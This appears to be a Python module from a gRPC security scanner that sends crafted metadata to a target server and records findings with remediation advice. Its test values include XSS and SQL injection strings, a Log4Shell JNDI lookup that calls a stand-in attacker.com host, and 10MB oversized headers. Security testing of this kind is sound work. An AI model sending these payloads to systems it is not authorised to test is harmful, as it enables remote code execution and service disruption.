"""Metadata security checks for gRPC services."""

import grpc
from typing import List, Tuple, Any

def check_metadata_injection(channel: grpc.Channel) -> List[Tuple[str, str, str, str, str]]:
    """Check for metadata injection vulnerabilities."""
    findings = []
    try:
        # Test metadata injection
        injection_tests = [
            ('x-forwarded-for', '"><script>alert(1)</script>'),
            ('user-agent', "' OR '1'='1"),
            ('custom-header', '${jndi:ldap://attacker.com/exploit}'),
            ('authorization', 'Basic: AA=='*1000)  # Large auth header
        ]

        for key, value in injection_tests:
            try:
                metadata = [(key, value)]
                response = channel.unary_unary('test')(b'', metadata=metadata)
                findings.append((
                    "High",
                    "Metadata injection vulnerability",
                    f"Server accepts potentially malicious metadata: {key}",
                    "Implement strict metadata validation and sanitization",
                    "gRPC Metadata Security"
                ))
            except Exception:
                continue
    except Exception:
        pass
    return findings

def check_metadata_size_limits(channel: grpc.Channel) -> List[Tuple[str, str, str, str, str]]:
    """Check for metadata size limit vulnerabilities."""
    findings = []
    try:
        # Test metadata size limits
        large_metadata = [('x-test', 'A' * (10 * 1024 * 1024))]  # 10MB metadata
        try:
            response = channel.unary_unary('test')(b'', metadata=large_metadata)
            findings.append((
                "Medium",
                "Missing metadata size limits",
                "Server accepts large metadata values",
                "Implement metadata size limits",
                "gRPC Metadata Size Limits"
            ))
        except Exception:
            pass
    except Exception:
        pass
    return findings

def check_metadata_key_validation(channel: grpc.Channel) -> List[Tuple[str, str, str, str, str]]:
    """Check for metadata key validation issues."""
    findings = []
    try:
        # Test metadata key validation
        invalid_keys = [
            'grpc-status',  # Reserved header
            'grpc-message',  # Reserved header
            'content-type',  # HTTP header
            'te',           # HTTP header
            ':path'         # HTTP/2 pseudo-header
        ]

        for key in invalid_keys:
            try:
                metadata = [(key, 'test')]
                response = channel.unary_unary('test')(b'', metadata=metadata)
                findings.append((
                    "Medium",
                    "Weak metadata validation",
                    f"Server accepts reserved/invalid metadata key: {key}",
                    "Implement strict metadata key validation",
                    "gRPC Metadata Validation"
                ))
            except Exception:
                continue
    except Exception:
        pass
    return findings

def check_metadata_encoding(channel: grpc.Channel) -> List[Tuple[str, str, str, str, str]]:
    """Check for metadata encoding issues."""
    findings = []
    try:
        # Test metadata encoding
        metadata = [('x-test', 'ÿ' * 1000)]  # Non-ASCII characters
        try:
            response = channel.unary_unary('test')(b'', metadata=metadata)
            findings.append((
                "Low",
                "Non-ASCII metadata accepted",
                "Server accepts non-ASCII characters in metadata",
                "Implement strict metadata character encoding validation",
                "gRPC Metadata Encoding"
            ))
        except Exception:
            pass
    except Exception:
        pass
    return findings

def check_metadata_security(target: str, port: int) -> List[Tuple[str, str, str, str, str]]:
    """Run all metadata security checks."""
    findings = []
    try:
        channel = grpc.insecure_channel(f"{target}:{port}")
        findings.extend(check_metadata_injection(channel))
        findings.extend(check_metadata_size_limits(channel))
        findings.extend(check_metadata_key_validation(channel))
        findings.extend(check_metadata_encoding(channel))
    except Exception:
        pass
    return findings 